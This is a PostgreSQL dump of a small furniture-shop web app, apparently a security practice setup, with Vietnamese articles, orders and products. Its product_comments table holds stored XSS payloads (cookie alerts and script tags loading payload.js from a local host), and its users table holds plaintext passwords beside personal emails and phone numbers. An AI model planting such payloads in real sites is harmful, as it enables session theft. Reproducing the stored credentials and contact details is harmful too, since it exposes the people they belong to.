--
-- PostgreSQL database dump
--

-- Dumped from database version 15.14 (Debian 15.14-1.pgdg13+1)
-- Dumped by pg_dump version 17.4 (Debian 17.4-1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET transaction_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: article_comments; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.article_comments (
    id integer NOT NULL,
    article_id integer NOT NULL,
    user_id integer,
    content text
);


ALTER TABLE public.article_comments OWNER TO postgres;

--
-- Name: article_comments_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.article_comments_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.article_comments_id_seq OWNER TO postgres;

--
-- Name: article_comments_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.article_comments_id_seq OWNED BY public.article_comments.id;


--
-- Name: articles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.articles (
    id integer NOT NULL,
    title character varying(255) NOT NULL,
    content text,
    user_id integer
);


ALTER TABLE public.articles OWNER TO postgres;

--
-- Name: articles_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.articles_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.articles_id_seq OWNER TO postgres;

--
-- Name: articles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.articles_id_seq OWNED BY public.articles.id;


--
-- Name: order_details; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.order_details (
    id integer NOT NULL,
    order_id integer NOT NULL,
    product_id integer NOT NULL,
    quantity integer DEFAULT 1 NOT NULL
);


ALTER TABLE public.order_details OWNER TO postgres;

--
-- Name: order_details_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.order_details_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.order_details_id_seq OWNER TO postgres;

--
-- Name: order_details_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.order_details_id_seq OWNED BY public.order_details.id;


--
-- Name: orders; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.orders (
    id integer NOT NULL,
    user_id integer,
    status character varying(50) DEFAULT 'pending'::character varying NOT NULL,
    address text
);


ALTER TABLE public.orders OWNER TO postgres;

--
-- Name: orders_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.orders_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.orders_id_seq OWNER TO postgres;

--
-- Name: orders_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.orders_id_seq OWNED BY public.orders.id;


--
-- Name: product_comments; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.product_comments (
    id integer NOT NULL,
    user_id integer,
    product_id integer NOT NULL,
    content text
);


ALTER TABLE public.product_comments OWNER TO postgres;

--
-- Name: product_comments_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.product_comments_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.product_comments_id_seq OWNER TO postgres;

--
-- Name: product_comments_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.product_comments_id_seq OWNED BY public.product_comments.id;


--
-- Name: products; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.products (
    id integer NOT NULL,
    name character varying(255) NOT NULL,
    description text,
    price numeric(12,2) DEFAULT 0.00,
    created_by integer,
    img_link text
);


ALTER TABLE public.products OWNER TO postgres;

--
-- Name: products_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.products_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.products_id_seq OWNER TO postgres;

--
-- Name: products_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.products_id_seq OWNED BY public.products.id;


--
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.users (
    id integer NOT NULL,
    name character varying(150),
    email character varying(255) NOT NULL,
    phone character varying(30),
    username character varying(100) NOT NULL,
    password character varying(255) NOT NULL,
    role character varying(50) DEFAULT 'user'::character varying NOT NULL
);


ALTER TABLE public.users OWNER TO postgres;

--
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.users_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.users_id_seq OWNER TO postgres;

--
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.users_id_seq OWNED BY public.users.id;


--
-- Name: article_comments id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.article_comments ALTER COLUMN id SET DEFAULT nextval('public.article_comments_id_seq'::regclass);


--
-- Name: articles id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.articles ALTER COLUMN id SET DEFAULT nextval('public.articles_id_seq'::regclass);


--
-- Name: order_details id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.order_details ALTER COLUMN id SET DEFAULT nextval('public.order_details_id_seq'::regclass);


--
-- Name: orders id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.orders ALTER COLUMN id SET DEFAULT nextval('public.orders_id_seq'::regclass);


--
-- Name: product_comments id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.product_comments ALTER COLUMN id SET DEFAULT nextval('public.product_comments_id_seq'::regclass);


--
-- Name: products id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.products ALTER COLUMN id SET DEFAULT nextval('public.products_id_seq'::regclass);


--
-- Name: users id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users ALTER COLUMN id SET DEFAULT nextval('public.users_id_seq'::regclass);


--
-- Data for Name: article_comments; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.article_comments (id, article_id, user_id, content) FROM stdin;
\.


--
-- Data for Name: articles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.articles (id, title, content, user_id) FROM stdin;
3	Furni – Giải pháp nội thất tối giản cho không gian hiện đại	Phong cách tối giản đang trở thành xu hướng được nhiều gia đình yêu thích bởi sự tinh gọn, tiện nghi và mang lại cảm giác thư thái trong cuộc sống hằng ngày. Furni ra đời với sứ mệnh mang đến những thiết kế nội thất vừa hiện đại, vừa đơn giản nhưng vẫn giữ được tính thẩm mỹ cao.\r\nCác sản phẩm của Furni thường sử dụng gam màu trung tính, đường nét thanh mảnh, dễ kết hợp trong nhiều không gian khác nhau. Nhờ đó, bạn có thể tạo nên một căn hộ thoáng đãng, gọn gàng mà vẫn thể hiện được cá tính riêng. Furni không chỉ là nội thất, mà còn là phong cách sống tinh tế dành cho người yêu sự giản dị.	1
4	Biến phòng khách thành điểm nhấn với nội thất Furni	Phòng khách luôn được xem là "bộ mặt" của ngôi nhà – nơi gia chủ tiếp đón bạn bè, người thân và thể hiện gu thẩm mỹ riêng. Với các sản phẩm sofa, bàn trà, kệ tivi từ Furni, bạn có thể dễ dàng biến phòng khách thành một không gian vừa ấm áp, vừa sang trọng.\r\nĐiểm nổi bật của nội thất Furni chính là sự kết hợp hài hòa giữa công năng và kiểu dáng. Sofa được thiết kế với chất liệu nệm êm ái, khung gỗ chắc chắn; bàn trà nhỏ gọn nhưng tinh tế; kệ tivi rộng rãi và tiện dụng. Tất cả tạo nên một tổng thể thống nhất, giúp phòng khách luôn gọn gàng, hiện đại và để lại ấn tượng mạnh mẽ với khách đến chơi.	1
5	Furni – Tận hưởng không gian sống tiện nghi và thoải mái	Một không gian sống đẹp không chỉ là nơi để ở, mà còn là nơi để thư giãn và tận hưởng. Furni chú trọng thiết kế nội thất với phương châm “đẹp từ ngoài, tiện từ trong”, nghĩa là mỗi sản phẩm đều có sự cân nhắc kỹ lưỡng về tính năng và trải nghiệm của người dùng.\r\nVí dụ, những chiếc giường Furni được thiết kế chắc chắn, kết hợp ngăn kéo chứa đồ thông minh, vừa tiết kiệm diện tích vừa mang lại sự tiện lợi. Bàn ghế ăn cũng được thiết kế đơn giản nhưng tạo cảm giác gần gũi, giúp bữa cơm gia đình trở nên ấm áp hơn. Với Furni, bạn không chỉ sở hữu đồ nội thất, mà còn nâng tầm chất lượng cuộc sống.	1
6	Không gian làm việc hiệu quả hơn với bàn ghế Furni	Trong thời đại làm việc từ xa và xu hướng “work from home” phát triển, việc xây dựng một góc làm việc thoải mái, khoa học tại nhà là vô cùng cần thiết. Furni mang đến các mẫu bàn làm việc, ghế công thái học, kệ sách đa năng, giúp bạn tạo nên một môi trường làm việc đầy cảm hứng.\r\nCác sản phẩm bàn ghế của Furni được thiết kế với tiêu chuẩn công thái học, hỗ trợ dáng ngồi đúng, hạn chế mệt mỏi khi làm việc nhiều giờ. Ngoài ra, kệ sách và tủ tài liệu gọn gàng còn giúp không gian luôn ngăn nắp, tăng sự tập trung. Nhờ đó, bạn có thể làm việc hiệu quả hơn, đồng thời giữ gìn sức khỏe lâu dài.	1
7	Furni – Nội thất bền đẹp, thân thiện với môi trường	Một trong những điểm cộng lớn của Furni là định hướng sản xuất nội thất thân thiện với môi trường. Chất liệu được chọn lọc kỹ càng, ưu tiên gỗ tự nhiên, ván ép chất lượng cao hoặc vật liệu tái chế an toàn, vừa bền bỉ vừa giảm tác động tiêu cực đến môi trường.\r\nNgoài ra, các sản phẩm của Furni đều có độ bền cao, ít hư hỏng, giúp bạn tiết kiệm chi phí thay mới trong thời gian dài. Không chỉ thế, với phong cách thiết kế vượt thời gian, bạn có thể yên tâm sử dụng lâu dài mà không lo lỗi mốt. Furni mang đến sự lựa chọn thông minh cho những ai yêu thích phong cách sống xanh và bền vững.	1
\.


--
-- Data for Name: order_details; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.order_details (id, order_id, product_id, quantity) FROM stdin;
2	3	1	6
3	4	1	2
4	5	1	14
5	6	6	1
6	6	4	1
7	7	6	2
\.


--
-- Data for Name: orders; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.orders (id, user_id, status, address) FROM stdin;
3	2	closed	tay ho - hanoi
2	2	closed	Tay Ho - Hanoi
1	2	closed	Tay Ho - Hanoi
4	1	open	fffff
5	1	open	wwwww
6	3	open	tayho-hanoi
7	3	open	tayho-hanoi
\.


--
-- Data for Name: product_comments; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.product_comments (id, user_id, product_id, content) FROM stdin;
4	2	3	<script>alert(3)</script>
6	2	4	<script src=http://127.0.0.1:8080/payload.js></script>
7	2	4	<script>alert(document.cookie)</script>
8	2	4	
9	2	2	<script>alert(document.cookie)</script>
10	2	5	<script src=http://127.0.0.1:8080/payload.js></script>
11	2	5	<script src=http://127.0.0.1:8080/payload.js></script>
12	4	1	<script>alert(3)</script>
\.


--
-- Data for Name: products; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.products (id, name, description, price, created_by, img_link) FROM stdin;
1	chair01	ghế đẹp, ghế sịn 	100.00	1	1757857480482.png
2	Nordic Chair		500.00	1	1758249867300.png
3	Kruzo Aero Chair		500.00	1	1758249937631.png
4	Ergonomic Chair		500.00	1	1758249970715.png
5	coach		1000.00	1	1758250007248.png
6	sofa		600.00	1	1758250046771.png
7	computer chair		500.00	1	1758600328103.jpg
\.


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.users (id, name, email, phone, username, password, role) FROM stdin;
2	nvmcuong	nvmcuong2002@gmail.com	0393199355	nvmcuong	02082002.	user
3	nguyenvuminhcuong	nguyenvuminhcuong2002@gmail.com	0393199355	nguyenvuminhcuong	02082002.	user
1	root	root@furni.com	0393199355	root	$2b$08$I1TpI49xO9B8JYNgT6IwhO5rYlQVQtop3VRCo7VXq6K01tnw7vbhO	admin
4	hacker101	hacker101@gmail.com	0393199355	hacker101	$2b$08$xBSSiV.MPZNB9yPvU7N2duRew0IaJf3C2AxUrisHu/AC7c4GYPmy2	admin
\.


--
-- Name: article_comments_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.article_comments_id_seq', 1, false);


--
-- Name: articles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.articles_id_seq', 7, true);


--
-- Name: order_details_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.order_details_id_seq', 7, true);


--
-- Name: orders_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.orders_id_seq', 7, true);


--
-- Name: product_comments_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.product_comments_id_seq', 12, true);


--
-- Name: products_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.products_id_seq', 7, true);


--
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.users_id_seq', 4, true);


--
-- Name: article_comments article_comments_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.article_comments
    ADD CONSTRAINT article_comments_pkey PRIMARY KEY (id);


--
-- Name: articles articles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT articles_pkey PRIMARY KEY (id);


--
-- Name: order_details order_details_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.order_details
    ADD CONSTRAINT order_details_pkey PRIMARY KEY (id);


--
-- Name: orders orders_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.orders
    ADD CONSTRAINT orders_pkey PRIMARY KEY (id);


--
-- Name: product_comments product_comments_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.product_comments
    ADD CONSTRAINT product_comments_pkey PRIMARY KEY (id);


--
-- Name: products products_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.products
    ADD CONSTRAINT products_pkey PRIMARY KEY (id);


--
-- Name: users users_email_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_email_key UNIQUE (email);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- Name: users users_username_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_username_key UNIQUE (username);


--
-- Name: idx_article_comments_article_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_article_comments_article_id ON public.article_comments USING btree (article_id);


--
-- Name: idx_article_comments_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_article_comments_user_id ON public.article_comments USING btree (user_id);


--
-- Name: idx_articles_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_articles_user_id ON public.articles USING btree (user_id);


--
-- Name: idx_order_details_order_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_order_details_order_id ON public.order_details USING btree (order_id);


--
-- Name: idx_order_details_product_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_order_details_product_id ON public.order_details USING btree (product_id);


--
-- Name: idx_orders_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_orders_user_id ON public.orders USING btree (user_id);


--
-- Name: idx_product_comments_product_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_product_comments_product_id ON public.product_comments USING btree (product_id);


--
-- Name: idx_product_comments_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_product_comments_user_id ON public.product_comments USING btree (user_id);


--
-- Name: idx_products_created_by; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX idx_products_created_by ON public.products USING btree (created_by);


--
-- Name: article_comments fk_article_comments_article; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.article_comments
    ADD CONSTRAINT fk_article_comments_article FOREIGN KEY (article_id) REFERENCES public.articles(id) ON DELETE CASCADE;


--
-- Name: article_comments fk_article_comments_user; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.article_comments
    ADD CONSTRAINT fk_article_comments_user FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE SET NULL;


--
-- Name: articles fk_articles_user; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT fk_articles_user FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE SET NULL;


--
-- Name: order_details fk_order_details_order; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.order_details
    ADD CONSTRAINT fk_order_details_order FOREIGN KEY (order_id) REFERENCES public.orders(id) ON DELETE CASCADE;


--
-- Name: order_details fk_order_details_product; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.order_details
    ADD CONSTRAINT fk_order_details_product FOREIGN KEY (product_id) REFERENCES public.products(id) ON DELETE RESTRICT;


--
-- Name: orders fk_orders_user; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.orders
    ADD CONSTRAINT fk_orders_user FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE SET NULL;


--
-- Name: product_comments fk_product_comments_product; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.product_comments
    ADD CONSTRAINT fk_product_comments_product FOREIGN KEY (product_id) REFERENCES public.products(id) ON DELETE CASCADE;


--
-- Name: product_comments fk_product_comments_user; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.product_comments
    ADD CONSTRAINT fk_product_comments_user FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE SET NULL;


--
-- Name: products fk_products_user; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.products
    ADD CONSTRAINT fk_products_user FOREIGN KEY (created_by) REFERENCES public.users(id) ON DELETE SET NULL;


--
-- PostgreSQL database dump complete
--

